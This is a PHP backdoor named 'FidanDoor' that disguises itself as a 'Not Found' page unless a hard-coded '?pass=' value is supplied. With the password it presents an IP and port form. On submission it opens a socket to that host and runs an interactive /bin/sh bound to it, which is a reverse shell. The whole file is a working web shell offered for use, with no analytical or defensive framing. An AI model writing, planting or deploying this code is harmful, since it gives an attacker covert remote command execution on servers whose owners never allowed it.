<?php

//You Should Define The Pass
//-------------------------------------

$LoaderPass = "1234";

//use ?pass= parameter for access to the connection page.

//--------------------------------------
//https://github.com/MorphaxTheDeveloper
//--------------------------------------

if(isset($_GET['pass']) && $_GET['pass'] == $LoaderPass){
    $ShowExtended = true;
}else{
    $ShowExtended = false;
}
?>

<html>
<head></head>
<body>
    <?php

    if($ShowExtended == false){
    echo("
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>".$_SERVER['SERVER_SIGNATURE']."</address>");
}?>

<?php
    if($ShowExtended == true){

        echo('
        <div class="box">
        <center><img src="https://i.hizliresim.com/qw9dsqv.png" style="height:250px; width: auto;"></center>
        <br>
        <i><center><h2 style="color: white;">FidanDoor</h2></center></i>
        <br>
        <form method="post">
        <center><div class="alignitem"><h3>  Ip: </h3><input type="text" class="textbox" name="ip" required></div></center>
        <center><div class="alignitem"><h3>Port: </h3><input type="text" class="textbox2" name="port" required></div></center>
        <br>
        <center><div class="alignitem"><input type="submit" class="textbox2" style="width:150px;" value="Connect"></div></center>
        </form>
        <br>
        <center>'.
        $_SERVER['SERVER_SIGNATURE']
        .'        
        </center></div>
        ');
    }
?>

</body>

<?php
    if($ShowExtended == true){
        echo("
<style>

body{
background-color: #182028;
color: white;
font-family: 'Times New Roman', Times, serif;
max-width: 800px;
margin-left:auto;
margin-right:auto;

}

.box{
    background-color: black;
    padding-top: 1%;
    padding-bottom: 5%;
    border-radius: 15px;

}

.alignitem{
    display: flex;
    justify-content: center;

}

.textbox{
    margin-left: 25px;
    height: 50px;
    background-color: #181820;
    color: red;
    font-size: large;
    border-radius: 15px;

}

.textbox2{
    margin-left: 10px;
    height: 50px;
    background-color: #181820;
    color: red;
    font-size: large;
    border-radius: 15px;

}

</style>");

}
?>
</html>

<?php
function startConnection($ip,$port){
$sock = fsockopen($ip,$port);
exec("/bin/sh -i <&3 >&3 2>&3");
}

if($_POST){
    $getip = $_POST['ip'];
    $getport = $_POST['port'];
    echo("wait for the connection..");
    startConnection($getip,$getport);
}

?>
